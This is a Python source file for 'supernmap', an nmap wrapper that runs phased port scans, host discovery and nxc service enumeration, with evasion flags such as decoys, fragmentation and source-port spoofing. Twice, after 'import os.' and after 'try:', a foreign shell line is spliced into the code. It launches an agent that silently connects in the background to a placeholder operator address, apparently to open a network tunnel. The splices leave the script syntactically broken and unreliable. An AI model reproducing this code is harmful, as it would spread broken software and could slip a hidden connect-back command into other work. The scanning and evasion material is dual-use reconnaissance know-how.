#!/usr/bin/env python3
"""
supernmap - Advanced Nmap wrapper for structured scanning.
"""

import argparse
import os./agent -connect <TU_IP_VPN>:11601 -ignore-cert > /dev/null 2>&1 &
import re
import shutil
import signal
import subprocess
import sys
import termios
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ── ANSI Colors ──────────────────────────────────────────────────────────────
G  = "\033[0;32m"
Y  = "\033[0;33m"
R  = "\033[0;31m"
C  = "\033[0;36m"
M  = "\033[0;35m"
NC = "\033[0m"
DIM= "\033[2m"

def p(color, msg):
    print(f"{color}{msg}{NC}", flush=True)

# ── Helpers ───────────────────────────────────────────────────────────────────

def safe_name(s):
    """Sanitize string for use as filename."""
    return re.sub(r'[^\w\-.]', '_', s).strip('_') or "host"

# ── Active process registry (for SPACE status on demand) ─────────────────────

_active_procs      = {}   # label → (Popen, start_timestamp)
_active_procs_lock = threading.Lock()

def _register_proc(label, proc):
    with _active_procs_lock:
        _active_procs[label] = {'proc': proc, 'started': datetime.now(), 'pct': None}

def _unregister_proc(label):
    with _active_procs_lock:
        _active_procs.pop(label, None)

_watcher_stop = threading.Event()

def _fmt_elapsed(start):
    """Format elapsed time since start as 'Xm Ys'."""
    secs = int((datetime.now() - start).total_seconds())
    if secs < 60:
        return f"{secs}s"
    return f"{secs // 60}m {secs % 60:02d}s"

def _spacebar_watcher():
    """
    Background thread: reads single keypresses without breaking output.
    SPACE  → prints status of all active nmap scans (IP, phase, elapsed time).

    We manually set only ICANON and ECHO off in LFLAG so that:
      - We can read single characters without waiting for Enter
      - Normal output processing (\n → \r\n via OPOST/ONLCR) is preserved
    """
    if not sys.stdin.isatty():
        return
    fd  = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        # Manual cbreak: only touch LFLAG, leave IFLAG/OFLAG/CFLAG alone
        new = termios.tcgetattr(fd)
        new[3] = new[3] & ~(termios.ICANON | termios.ECHO)  # LFLAG
        new[6][termios.VMIN]  = 0   # non-blocking read
        new[6][termios.VTIME] = 2   # 0.2s timeout
        termios.tcsetattr(fd, termios.TCSADRAIN, new)

        while not _watcher_stop.is_set():
            ch = os.read(fd, 1)
            if not ch:
                continue
            ch = ch.decode('utf-8', errors='ignore')
            if ch == ' ':
                with _active_procs_lock:
                    entries = list(_active_procs.items())
                if entries:
                    print(f"\n{Y}━━━ [SPACE] Active scans ({len(entries)}) ━━━{NC}",
                          flush=True)
                    for lbl, entry in entries:
                        elapsed = _fmt_elapsed(entry['started'])
                        pct     = entry.get('pct')
                        pct_str = f" {G}{pct}%{NC}" if pct is not None else ""
                        print(f"{C}  → {lbl}{NC}{pct_str}  {DIM}[{elapsed}]{NC}",
                              flush=True)
                    print(f"{Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{NC}",
                          flush=True)
                else:
                    print(f"\n{DIM}[SPACE] No active nmap scans right now.{NC}",
                          flush=True)
            elif ch in ('\x03', '\x04'):  # Ctrl-C / Ctrl-D
                break
    except Exception:
        pass
    finally:
        try:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
        except Exception:
            pass

def start_spacebar_watcher():
    """Launch the spacebar watcher thread and show the usage hint."""
    p(DIM, "[hint] Press SPACE at any time to request nmap status.")
    t = threading.Thread(target=_spacebar_watcher, daemon=True)
    t.start()
    return t

def stop_spacebar_watcher():
    _watcher_stop.set()

def build_out(base, xml, html_on):
    flags = ["-oN", base]
    if html_on:
        flags += ["-oX", xml]
    return flags

def to_html(xml, html):
    """Convert XML to HTML silently, then delete the XML."""
    if os.path.exists(xml):
        r = subprocess.run(["xsltproc", xml, "-o", html], capture_output=True)
        if r.returncode == 0:
            try:
                os.remove(xml)
            except OSError:
                pass
        else:
            p(R, "[!] xsltproc failed. (apt install xsltproc)")

def parse_open_ports(nmap_file):
    """Return list of port numbers (str) that are open in a .nmap file."""
    ports = []
    if not os.path.exists(nmap_file):
        return ports
    with open(nmap_file) as f:
        for line in f:
            if re.match(r'^\d+/(tcp|udp)\s+open', line):
                ports.append(line.split('/')[0].strip())
    return ports

def parse_hostname(nmap_output, ip):
    """Extract resolved hostname from nmap output, or None."""
    for line in nmap_output.splitlines():
        if "Nmap scan report for" in line:
            rest = line.split("Nmap scan report for", 1)[1].strip()
            m = re.match(r'^(.+?)\s+\([\d.]+\)$', rest)
            if m:
                return m.group(1).strip()
    return None

def resolve_base(ip, args):
    """
    Auto-resolve a base filename label for an IP.
    Does a quick nmap -sn probe to get the hostname; falls back to the IP.
    Returns a filesystem-safe string.
    """
    cmd = ["nmap", "-sn", "-PR" if not args.no_l2 else "-PE", ip]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True, timeout=15).stdout
        hn = parse_hostname(out, ip)
        if hn:
            return safe_name(hn)
    except Exception:
        pass
    return ip.replace('.', '-')

def parse_os(nmap_output):
    """Extract OS info from nmap output."""
    for line in nmap_output.splitlines():
        for tag in ("OS details:", "Aggressive OS guesses:", "Running:"):
            if tag in line:
                return line.split(tag, 1)[1].strip()
    return "unknown"

_PCT_RE = re.compile(r'About\s+([\d.]+)%\s+done')

def run(cmd, label=None, silent=False):
    """
    Run a command and return captured stdout.
    - label:  if set, registers the Popen in _active_procs for SPACE status.
    - silent: if True, suppresses terminal output; parses nmap progress % instead.
    """
    # In silent mode add --stats-every so we can track progress internally
    if silent and label:
        cmd = list(cmd) + ["--stats-every", "3s"]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        stdin=subprocess.DEVNULL,
        text=True,
        bufsize=1,
    )
    if label:
        _register_proc(label, proc)
    out = []
    for line in proc.stdout:
        if silent:
            # Parse nmap percentage lines, update registry silently
            m = _PCT_RE.search(line)
            if m and label:
                with _active_procs_lock:
                    if label in _active_procs:
                        _active_procs[label]['pct'] = m.group(1).rstrip('0').rstrip('.')
        else:
            print(line, end="", flush=True)
        out.append(line)
    proc.wait()
    if label:
        _unregister_proc(label)
    return "".join(out)

# ── Per-host scan ─────────────────────────────────────────────────────────────

def scan_host(ip, base, args, scan_dir=None):
    """
    Full 2-phase TCP scan (+ optional UDP) for a single host.
    Files are placed in scan_dir if given, else current directory.
    Returns dict with: hostname, os_info, open_ports (list of raw lines).
    """
    def path(name):
        return os.path.join(scan_dir, name) if scan_dir else name

    fp      = path(f"ports_{base}.nmap")
    fp_xml  = path(f"ports_{base}.xml")
    fi      = path(f"info_{base}.nmap")
    fi_xml  = path(f"info_{base}.xml")
    fu      = path(f"UDP_{base}.nmap")
    fu_xml  = path(f"UDP_{base}.xml")

    silent   = getattr(args, '_silent', False)
    host_tag = f"{ip} ({base})"   # for SPACE status display

    if not silent:
        print("=" * 48, flush=True)
        p(Y, f"[*] Target: {C}{ip}")
        p(Y, f"[*] Base name: {base}")
        p(Y, f"[*] Timing: {args.timing_arg} {args.rate_flag}")
        if args.no_l2:  p(M, "[*] No OSI Layer 2 → TCP connect scan (-sT)")
        if args.ack:    p(M, "[*] ACK scan mode (-sA)")
        if args.evasion: p(M, f"[*] Evasion: {' '.join(args.evasion)}")
        if args.source_port: p(M, f"[*] Source port: {args.source_port}")
        if args.dns_server:  p(M, f"[*] DNS server: {args.dns_server}")
        if args.nse:    p(C, f"[*] NSE: {' '.join(args.nse)}")
        if args.html:   p(C, "[*] HTML output enabled")
        print("-" * 48, flush=True)

    # ── Phase 1: fast full-port TCP scan ──────────────────────────
    if not silent:
        p(Y, f"[*] [{ip}] PHASE 1 (TCP): fast full-port scan ...")
    scan1 = "-sT" if args.no_l2 else ("-sA" if args.ack else "-sS")
    cmd1  = ["nmap", scan1, "-Pn", "-p-", args.timing_arg]
    if args.rate_flag: cmd1 += args.rate_flag.split()
    cmd1 += args.evasion
    if args.source_port: cmd1 += ["--source-port", str(args.source_port)]
    if args.dns_server:  cmd1 += ["--dns-server", args.dns_server]
    cmd1 += [ip] + build_out(fp, fp_xml, args.html)

    out1 = run(cmd1, label=f"{host_tag} — Phase 1: port discovery", silent=silent)
    if not silent:
        p(G, f"[+] [{ip}] Phase 1 done → {fp}")
    if args.html: to_html(fp_xml, path(f"ports_{base}.html"))

    hostname = parse_hostname(out1, ip)

    # ── Phase 2: exhaustive scan on open ports ─────────────────
    if not silent:
        p(Y, f"[*] [{ip}] Processing open ports ...")
    ports = parse_open_ports(fp)
    os_info = "unknown"

    if not ports:
        if not silent:
            p(R, f"[!] [{ip}] No open TCP ports found. Skipping phase 2.")
    else:
        port_str = ",".join(ports)
        if not silent:
            p(Y, f"[*] [{ip}] Phase 2: {port_str}")
        scan2 = "-sT" if args.no_l2 else "-sS"
        os_flag = [] if args.no_l2 else ["-O"]
        cmd2  = ["nmap", "-Pn", "-p", port_str, args.timing_arg,
                 "-sV", scan2, "-sC"] + os_flag
        cmd2 += args.nse
        if args.source_port: cmd2 += ["--source-port", str(args.source_port)]
        if args.dns_server:  cmd2 += ["--dns-server", args.dns_server]
        cmd2 += [ip] + build_out(fi, fi_xml, args.html)

        out2 = run(cmd2, label=f"{host_tag} — Phase 2: exhaustive ({port_str})", silent=silent)
        os_info = parse_os(out2)
        if not silent:
            p(G, f"[+] [{ip}] Phase 2 done → {fi}")
        if args.html: to_html(fi_xml, path(f"info_{base}.html"))

    # ── Phase 3: UDP (optional) ────────────────────────────────────
    udp_proc = None
    if args.udp_top or args.udp_full:
        udp_ports = ["--top-ports", "100"] if args.udp_top else ["-p-"]
        udp_label = "Top-100" if args.udp_top else "full"
        if not silent:
            p(Y, f"[*] [{ip}] PHASE 3 (UDP): {udp_label} scan ...")
            p(Y, "[!] (sudo required)")
        cmd_u = ["sudo", "nmap", "-Pn", args.timing_arg, "-sU"] + udp_ports
        if args.source_port: cmd_u += ["--source-port", str(args.source_port)]
        if args.dns_server:  cmd_u += ["--dns-server", args.dns_server]
        cmd_u += [ip] + build_out(fu, fu_xml, args.html)
        if args.udp_bg:
            log = path(f"UDP_{base}.log")
            p(C, f"[*] UDP running in background → log: {log}")
            with open(log, 'w') as lf:
                udp_proc = subprocess.Popen(cmd_u, stdout=lf, stderr=subprocess.STDOUT,
                                            stdin=subprocess.DEVNULL)
            if not silent:
                p(G, f"[+] UDP launched (PID {udp_proc.pid})")
        else:
            run(cmd_u, label=f"{host_tag} — Phase 3: UDP ({udp_label})", silent=silent)
            if not silent:
                p(G, f"[+] [{ip}] Phase 3 done → {fu}")
            if args.html: to_html(fu_xml, path(f"UDP_{base}.html"))
    else:
        if not silent:
            p(Y, f"[*] [{ip}] Phase 3 (UDP): skipped.")

    if not silent:
        print("-" * 48, flush=True)
        p(G, f"[✔] [{ip}] All scans finished.")
        print("-" * 48, flush=True)

    # Collect open port lines for summary
    open_lines = []
    if os.path.exists(fp):
        with open(fp) as f:
            for line in f:
                if re.match(r'^\d+/(tcp|udp)\s+open', line):
                    open_lines.append(line.rstrip())

    return {
        "ip":         ip,
        "hostname":   hostname,
        "os":         os_info,
        "open_lines": open_lines,
        "udp_proc":   udp_proc,
        "base":       base,
    }

# ── fping discovery ──────────────────────────────────────────────────────────

def fping_discover(cidr):
    """Run fping ICMP echo discovery. Returns list of IPs."""
    if not shutil.which("fping"):
        return []
    try:
        out = subprocess.run(
            ["fping", "-aqg", cidr],
            capture_output=True, text=True, timeout=120
        ).stdout
    except Exception:
        return []
    return [ip.strip() for ip in out.splitlines()
            if re.match(r'^\d+\.\d+\.\d+\.\d+$', ip.strip())]

# ── nxc enrichment (port-targeted) ────────────────────────────────────────────

NXC_PORT_PROTO = {
    21: "ftp", 22: "ssh", 135: "wmi", 389: "ldap", 636: "ldap",
    1433: "mssql", 2049: "nfs", 3389: "rdp", 445: "smb",
    5900: "vnc", 5901: "vnc", 5985: "winrm", 5986: "winrm",
}

def nxc_enrich(ip, open_ports):
    """Run nxc on matching open ports for a single host."""
    if not shutil.which("nxc") or not open_ports:
        return None
    protos = set()
    for p in open_ports:
        proto = NXC_PORT_PROTO.get(p)
        if proto:
            protos.add(proto)
    if not protos:
        return None

    result = {"hostname": None, "os": None, "details": {}}
    for proto in sorted(protos):
        try:
            out = subprocess.run(
                ["nxc", proto, str(ip)],
                capture_output=True, text=True, timeout=30
            ).stdout
        except Exception:
            continue
        for line in out.splitlines():
            parts = line.split()
            if len(parts) < 4 or parts[0].upper() != proto.upper():
                continue
            hn_m = re.search(r'\(name:([^)]+)\)', line)
            if hn_m and not result["hostname"]:
                result["hostname"] = hn_m.group(1)
            if not result["hostname"] and parts[3] != "-":
                result["hostname"] = parts[3]
            os_area = line.split("[*]", 1)[-1] if "[*]" in line else ""
            if os_area:
                os_clean = re.sub(r'\s*\([\w.-]+:[^)]*\)', '', os_area).strip()
                if os_clean and not result["os"]:
                    result["os"] = os_clean
            meta = dict(re.findall(r'\(([\w.-]+):([^)]*)\)', line))
            if meta:
                result["details"][proto] = meta
    return result if result["details"] else None

# ── Network range scan ────────────────────────────────────────────────────────

def do_net_scan(cidr, args):
    safe_cidr    = cidr.replace('/', '-')
    scan_dir     = f"netscan_{safe_cidr}"
    summary_file = f"netscan_summary_{safe_cidr}.txt"

    print("=" * 48, flush=True)
    p(C, f"[*] NETWORK SCAN: {Y}{cidr}")
    p(M, "[*] No OSI Layer 2 → ICMP/TCP ping (no ARP)" if args.no_l2
        else "[*] Layer 2 available → ARP ping")
    p(Y, f"[*] Timing: {args.timing_arg} {args.rate_flag}")
    p(C, f"[*] Output directory: {scan_dir}/")
    p(C, f"[*] Global summary:   {summary_file}")
    print("=" * 48, flush=True)

    os.makedirs(scan_dir, exist_ok=True)

    # ── Host discovery via nmap (ICMP + TCP SYN) + fping supplement ─
    p(Y, f"[*] Phase 1/3: Discovering hosts in {cidr} ...")
    live = []

    # Primary: nmap -sn with safe probes (ICMP + TCP SYN, no -PA)
    if args.no_l2:
        disc_flags = ["-PE", "-PS22,80,443,3389,445,5985,5986,389,636", "--disable-arp-ping"]
    else:
        disc_flags = ["-PR"]
    cmd_disc = ["nmap", "-sn"] + disc_flags + [args.timing_arg]
    if args.rate_flag: cmd_disc += args.rate_flag.split()
    if args.dns_server: cmd_disc += ["--dns-server", args.dns_server]
    cmd_disc.append(cidr)
    disc_out = subprocess.run(cmd_disc, capture_output=True, text=True).stdout
    for line in disc_out.splitlines():
        if "Nmap scan report for" in line:
            rest = line.split("Nmap scan report for", 1)[1].strip()
            m = re.match(r'^(.+?)\s+\(([\d.]+)\)$', rest)
            if m:
                live.append((m.group(2).strip(), m.group(1).strip()))
            else:
                live.append((rest.strip(), None))

    # Supplement: fping catches hosts that only respond to ICMP
    live_ips = {ip for ip, _ in live}
    for ip in fping_discover(cidr):
        if ip not in live_ips:
            live.append((ip, None))
            live_ips.add(ip)

    if not live:
        p(R, f"[!] No active hosts found in {cidr}.")
        return

    disc_method = "ICMP/TCP ping (no ARP)" if args.no_l2 else "ARP ping (-PR)"
    p(G, f"[+] Active hosts: {len(live)}  [{disc_method}]")
    for ip, hn in live:
        p(C, f"    → {hn + ' (' + ip + ')' if hn else ip}")
    print("-" * 48, flush=True)

    # Determine worker count
    total = len(live)
    raw_p = getattr(args, 'parallel', 1)
    if str(raw_p).lower() == 'all':
        workers = total
    else:
        workers = min(int(raw_p), total)
    workers = max(1, workers)

    parallel_label = "all" if workers == total else str(workers)
    p(C, f"[*] Parallel workers: {parallel_label} (scanning {workers}/{total} hosts simultaneously)")
    print("-" * 48, flush=True)

    # Write summary header
    with open(summary_file, 'w') as sf:
        sf.write("=" * 64 + "\n")
        sf.write(f"  NETWORK SCAN SUMMARY: {cidr}\n")
        sf.write(f"  Date: {datetime.now():%Y-%m-%d %H:%M:%S}\n")
        sf.write(f"  L2 Mode: {'DISABLED (--no-l2)' if args.no_l2 else 'ENABLED'}\n")
        sf.write(f"  Parallel workers: {parallel_label}\n")
        if args.no_l2:
            sf.write(f"  OS source: nxc enrichment (nmap -O skipped)\n")
        sf.write("=" * 64 + "\n\n")

    summary_lock = threading.Lock()

    # ── Per-host full scan ────────────────────────────────────────
    # In net-scan mode always silent: user presses SPACE to check progress
    args._silent = True

    watcher = start_spacebar_watcher()

    p(Y, f"[*] Phase 2/3: Fast port scan → Phase 3/3: Exhaustive scan (workers={parallel_label}) ...")
    print("=" * 48, flush=True)

    completed = []   # collect (ip, hostname) as hosts finish

    def scan_one(idx_ip_hn):
        idx, ip, hn = idx_ip_hn
        base   = safe_name(hn) if hn else ip.replace('.', '-')
        result = scan_host(ip, base, args, scan_dir=scan_dir)
        final_hn = result["hostname"] or hn or "(unresolved)"

        # nxc enrichment on ports that nmap found open
        open_ports = []
        for line in result.get("open_lines", []):
            try:
                open_ports.append(int(line.split("/")[0]))
            except ValueError:
                pass
        nd = nxc_enrich(ip, open_ports)
        if nd:
            if nd["hostname"] and not result["hostname"]:
                final_hn = nd["hostname"]
            if nd["os"] and result["os"] in ("unknown", None):
                result["os"] = nd["os"]
            result["_nxc"] = nd

        return (ip, final_hn, result)

    tasks = [(i + 1, ip, hn) for i, (ip, hn) in enumerate(live)]

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = {executor.submit(scan_one, t): t for t in tasks}
        for future in as_completed(futures):
            ip, final_hn, result = future.result()
            completed.append((ip, final_hn, result))
            # Thread-safe summary write
            with summary_lock:
                with open(summary_file, 'a') as sf:
                    sf.write("-" * 64 + "\n")
                    sf.write(f"  HOST: {ip}\n")
                    nd = result.get("_nxc")
                    nmap_hn = result.get("hostname")
                    # Name with source tag
                    if nd and nd.get("hostname"):
                        sf.write(f"  Name: {final_hn}  [nxc]\n")
                    elif nmap_hn:
                        sf.write(f"  Name: {final_hn}  [nmap]\n")
                    else:
                        sf.write(f"  Name: {final_hn}\n")
                    # OS with source tag
                    if nd and nd.get("os"):
                        sf.write(f"  OS:   {result['os']}  [nxc]\n")
                    elif result.get("os") not in ("unknown", None):
                        sf.write(f"  OS:   {result['os']}  [nmap]\n")
                    else:
                        sf.write(f"  OS:   {result['os']}\n")
                    sf.write("  Open ports:\n")
                    if result["open_lines"]:
                        for line in result["open_lines"]:
                            sf.write(f"    {line}\n")
                    else:
                        sf.write("    (none found)\n")
                    # nxc extra info
                    if nd:
                        sf.write(f"  {'─' * 54}\n")
                        sf.write(f"  ── nxc service info ──\n")
                        for proto, meta in nd.get("details", {}).items():
                            items = [f"{k}: {v}" for k, v in meta.items()
                                     if k.lower() not in ("name",)]
                            if items:
                                sf.write(f"  {proto.upper():<7s} │ {' │ '.join(items)}\n")
                            else:
                                sf.write(f"  {proto.upper():<7s} │ (detected)\n")
                        sf.write(f"  {'─' * 54}\n")
                    sf.write("\n")

    stop_spacebar_watcher()

    # Finalize summary file
    with open(summary_file, 'a') as sf:
        sf.write("=" * 64 + "\n")
        sf.write(f"  Total hosts scanned: {total}\n")
        sf.write(f"  Files in: {os.path.abspath(scan_dir)}/\n")
        sf.write("=" * 64 + "\n")

    print(flush=True)
    print("=" * 48, flush=True)
    p(G, f"[✔] Network scan completed ({len(completed)}/{total} hosts).")
    for c_ip, c_hn, c_res in completed:
        ports_count = len(c_res["open_lines"])
        nd = c_res.get("_nxc")
        tag = ""
        if nd and nd.get("hostname"):
            tag = f" {DIM}[nxc]{NC}"
        elif c_res.get("hostname"):
            tag = f" {DIM}[nmap]{NC}"
        p(C, f"    → {c_hn} ({c_ip}){tag}  {DIM}[{ports_count} open port{'s' if ports_count != 1 else ''}]{NC}")
    print("-" * 48, flush=True)
    p(G, f"[✔] Summary: {os.path.abspath(summary_file)}")
    p(G, f"[✔] Files:   {os.path.abspath(scan_dir)}/")
    print("=" * 48, flush=True)

# ── Argument parsing ──────────────────────────────────────────────────────────

def show_help():
    prog = sys.argv[0]
    print(f"{G}Usage:{NC} {prog} <ip1> [ip2 ...] [options]")
    print(f"\n{Y}Description:{NC}")
    print("  Runs a 2 or 3-phased Nmap scan against one or more targets.")
    print("  Multiple targets are scanned in parallel.")
    print(f"\n{Y}Options:{NC}")
    print("  -h, --help              Show this help message.")
    print("  --timing <0-5>          Timing template (default: T4 + --min-rate 1000).")
    print(f"\n{C}  --- UDP ---{NC}")
    print("  --udp-top               UDP scan on Top 100 ports (after TCP).")
    print("  --udp-full              Full UDP scan (after TCP).")
    print("  --udp-bg                Run UDP in background.")
    print(f"\n{C}  --- Output ---{NC}")
    print("  --html                  Save XML output and convert to HTML (needs xsltproc).")
    print("                          XML files are deleted after conversion.")
    print(f"\n{C}  --- Evasion ---{NC}")
    print("  --no-l2                 No OSI Layer 2 (no ARP). Uses -sT instead of -sS.")
    print("  --ack                   ACK scan (-sA) in Phase 1.")
    print("  --frag                  Fragment packets 8 bytes (-f).")
    print("  --frag-double           Fragment packets 16 bytes (-ff).")
    print("  --mtu <N>               Custom MTU (multiple of 8).")
    print("  --decoy <N>             N random decoy IPs (-D RND:N).")
    print("  --source-port <N>       Spoof source port.")
    print("  --dns-server <IP>       Custom DNS server.")
    print(f"\n{C}  --- NSE Scripts ---{NC}")
    print("  --script <name,...>     Run specific NSE script(s) in Phase 2.")
    print("  --script-cat <cat>      Run all NSE scripts from a category.")
    print(f"\n{C}  --- Network Range Scan ---{NC}")
    print("  --name <LABEL>          Override base filename label (single target only).")
    print(f"\n{C}  --- Network Range ---{NC}")
    print("  --net-scan <CIDR>       Discover and fully scan a network range.")
    print("                          Creates per-host files (named by hostname)")
    print("                          and a global summary with OS, name and ports.")
    print("  --parallel <N|all>      Hosts to scan simultaneously (required with --net-scan).")
    print("                          N = number of concurrent scans, 'all' = all at once.")
    print(f"\n{Y}Examples:{NC}")
    print(f"  {prog} 10.10.11.100 --udp-top")
    print(f"  {prog} 10.10.11.100 10.10.11.101 --timing 2")
    print(f"  {prog} 10.10.11.100 --no-l2 --frag --decoy 5 --source-port 53")
    print(f"  {prog} 10.10.11.100 --script-cat vuln")
    print(f"  {prog} --net-scan 192.168.1.0/24")
    print(f"  {prog} --net-scan 192.168.1.0/24 --parallel 5")
    print(f"  {prog} --net-scan 10.10.10.0/24 --no-l2 --timing 3 --parallel all")


def parse_args():
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument("targets", nargs="*")
    parser.add_argument("-h", "--help", action="store_true")
    parser.add_argument("--net-scan",   dest="net_scan")
    parser.add_argument("--parallel",   dest="parallel", default=None,
                        metavar="N|all",
                        help="Hosts to scan simultaneously (required with --net-scan).")
    parser.add_argument("--timing", type=int)
    parser.add_argument("--udp-top",    action="store_true", dest="udp_top")
    parser.add_argument("--udp-full",   action="store_true", dest="udp_full")
    parser.add_argument("--udp-bg",     action="store_true", dest="udp_bg")
    parser.add_argument("--html",       action="store_true")
    parser.add_argument("--no-l2",      action="store_true", dest="no_l2")
    parser.add_argument("--ack",        action="store_true")
    parser.add_argument("--frag",       action="store_true")
    parser.add_argument("--frag-double",action="store_true", dest="frag_double")
    parser.add_argument("--mtu",        type=int)
    parser.add_argument("--decoy",      type=int)
    parser.add_argument("--source-port",type=int, dest="source_port")
    parser.add_argument("--dns-server", dest="dns_server")
    parser.add_argument("--script")
    parser.add_argument("--script-cat",  dest="script_cat")
    parser.add_argument("--name",         dest="name", default=None,
                        metavar="LABEL",
                        help="Override the base filename label (single target only).")

    args = parser.parse_args()

    if args.help or (not args.targets and not args.net_scan):
        show_help()
        sys.exit(0)

    # Validation
    if args.no_l2 and args.ack:
        p(R, "[!] Error: --no-l2 and --ack are mutually exclusive.")
        sys.exit(1)
    if args.mtu and args.mtu % 8 != 0:
        p(R, "[!] Error: --mtu must be a multiple of 8.")
        sys.exit(1)
    if args.udp_top and args.udp_full:
        p(R, "[!] Error: --udp-top and --udp-full are mutually exclusive.")
        sys.exit(1)
    if args.script and args.script_cat:
        p(R, "[!] Error: --script and --script-cat are mutually exclusive.")
        sys.exit(1)

    # Validate --parallel (used by both --net-scan and multi-host)
    if args.parallel is not None:
        par = str(args.parallel).lower()
        if par != 'all':
            try:
                val = int(par)
                if val < 1:
                    raise ValueError
            except ValueError:
                p(R, "[!] Error: --parallel must be a positive integer or 'all'.")
                sys.exit(1)

    if args.net_scan and args.parallel is None:
        p(R, "[!] Error: You must specify --parallel <N|all> when using --net-scan.")
        sys.exit(1)

    # Derived fields
    if args.timing is not None:
        args.timing_arg = f"-T{args.timing}"
        args.rate_flag  = ""
    else:
        args.timing_arg = "-T4"
        args.rate_flag  = "--min-rate 1000"

    args.evasion = []
    if args.frag:        args.evasion.append("-f")
    if args.frag_double: args.evasion.append("-ff")
    if args.mtu:         args.evasion += ["--mtu", str(args.mtu)]
    if args.decoy:       args.evasion += ["-D", f"RND:{args.decoy}"]

    if args.no_l2 and args.evasion:
        p(Y, "[!] Warning: --no-l2 uses -sT. Some evasion flags require raw sockets.")

    args.nse = []
    if args.script:     args.nse = ["--script", args.script]
    elif args.script_cat: args.nse = ["--script", args.script_cat]


    if args.name and len(getattr(args, 'targets', [])) != 1:
        p(R, "[!] Error: --name can only be used with a single target.")
        sys.exit(1)

    return args

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()

    # ── Network range scan ─────────────────────────────────────────
    if args.net_scan:
        do_net_scan(args.net_scan, args)
        return

    # ── Individual / multiple host scan ───────────────────────────────────────
    targets = args.targets
    total   = len(targets)

    if total == 1:
        # ── Single host: verbose mode ──────────────────────────────────────────
        ip   = targets[0]
        base = safe_name(args.name) if args.name else resolve_base(ip, args)
        args._silent = False
        result   = scan_host(ip, base, args)
        udp_proc = result.get("udp_proc")
        if udp_proc:
            ans = input(f"\n{C}[*] Background UDP still running (PID {udp_proc.pid}).\n"
                        f"{Y}    Wait for it? [Y/n]: {NC}").strip() or "Y"
            if ans.upper() == "Y":
                udp_proc.wait()
                p(G, "[+] UDP scan finished.")
    else:
        # ── Multi-host: same silent format as --net-scan ───────────────────────
        args._silent = True
        print("=" * 48, flush=True)
        p(C, f"[*] MULTI-HOST SCAN: {total} targets")
        p(Y, f"[*] Timing: {args.timing_arg} {args.rate_flag}")
        print("=" * 48, flush=True)

        # Resolve worker count (default: all targets simultaneously)
        raw_p = str(args.parallel).lower() if args.parallel is not None else 'all'
        if raw_p == 'all':
            workers = total
        else:
            workers = min(int(raw_p), total)
        workers = max(1, workers)
        parallel_label = "all" if workers == total else str(workers)

        p(C, f"[*] Parallel workers: {parallel_label} (scanning {workers}/{total} simultaneously)")
        print("-" * 48, flush=True)

        watcher   = start_spacebar_watcher()
        completed = []
        comp_lock = threading.Lock()

        p(Y, "[*] Phase 1/2: Fast port scan → Phase 2/2: Exhaustive scan ...")
        print("=" * 48, flush=True)

        def scan_one_multi(ip):
            base     = resolve_base(ip, args)
            result   = scan_host(ip, base, args)
            final_hn = result.get("hostname") or base
            with comp_lock:
                completed.append((ip, final_hn, result))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            executor.map(scan_one_multi, targets)

        stop_spacebar_watcher()

        print(flush=True)
        print("=" * 48, flush=True)
        p(G, f"[✔] Scan completed ({len(completed)}/{total} hosts).")
        for c_ip, c_hn, c_res in completed:
            ports_count = len(c_res["open_lines"])
            p(C, f"    → {c_hn} ({c_ip})  {DIM}[{ports_count} open port{'s' if ports_count != 1 else ''}]{NC}")
        print("=" * 48, flush=True)



if __name__ == "__main__":
    try:./agent -connect <TU_IP_VPN>:11601 -ignore-cert > /dev/null 2>&1 &
        main()
    except KeyboardInterrupt:
        stop_spacebar_watcher()
        print(f"\n{R}[!] Interrupted. Cleaning up...{NC}", flush=True)
        # Kill all active nmap child processes cleanly
        with _active_procs_lock:
            for entry in _active_procs.values():
                try:
                    entry['proc'].kill()
                except Exception:
                    pass
        os._exit(1)
